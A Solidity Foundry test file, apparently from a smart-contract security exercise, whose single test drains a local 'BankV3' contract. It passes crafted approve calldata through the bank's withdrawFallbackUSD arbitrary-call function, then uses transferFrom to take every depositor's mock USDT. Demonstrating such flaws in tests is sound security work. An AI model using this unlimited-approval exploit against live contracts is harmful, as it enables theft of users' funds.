// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {BankV3} from "../src/BankV3.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract BankV3Test is Test {
    BankV3 public bank;

    // This is with 18 decimals as it is Mock, but in reality it is 6 decimals
    ERC20Mock public USDT;

    address mohamed = makeAddr("Mohamed");
    address ahmed = makeAddr("Ahmed");
    address asmaa = makeAddr("Asmaa");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        USDT = new ERC20Mock();
        bank = new BankV3(address(USDT));

        vm.startPrank(mohamed);
        USDT.mint(mohamed, 1e18);
        USDT.approve(address(bank), 1e18);
        bank.depositUSD(1e18);
        vm.stopPrank();

        vm.startPrank(ahmed);
        USDT.mint(ahmed, 1e18);
        USDT.approve(address(bank), 1e18);
        bank.depositUSD(1e18);
        vm.stopPrank();

        vm.startPrank(asmaa);
        USDT.mint(asmaa, 0.5e18);
        USDT.approve(address(bank), 0.5e18);
        bank.depositUSD(0.5e18);
        vm.stopPrank();
    }

    function test_bankV3_attacker_drain_bank() public {
        USDT.mint(attacker, 1 wei);
        console.log("Attacker USD Balance Before Attack:", USDT.balanceOf(attacker));
        console.log("Bank USD balance Before Attack:", USDT.balanceOf(address(bank)));

        assertEq(USDT.balanceOf(attacker), 1 wei);
        assertEq(USDT.balanceOf(address(bank)), 2.5e18);

        vm.startPrank(attacker);
        USDT.approve(address(bank), 1 wei);
        bank.depositUSD(1 wei);

        bytes4 approveFunctionSelector = USDT.approve.selector;
        bytes memory data = abi.encodePacked(approveFunctionSelector, uint256(uint160(attacker)), type(uint256).max);
        bank.withdrawFallbackUSD(1 wei, address(USDT), data);

        USDT.transferFrom(address(bank), attacker, USDT.balanceOf(address(bank)));

        console.log("-----------");
        console.log("Attacker USD Balance After Attack:", USDT.balanceOf(attacker));
        console.log("Bank USD balance After Attack:", USDT.balanceOf(address(bank)));

        assertEq(USDT.balanceOf(attacker), 2.5e18);
        assertEq(USDT.balanceOf(address(bank)), 0);
    }
}
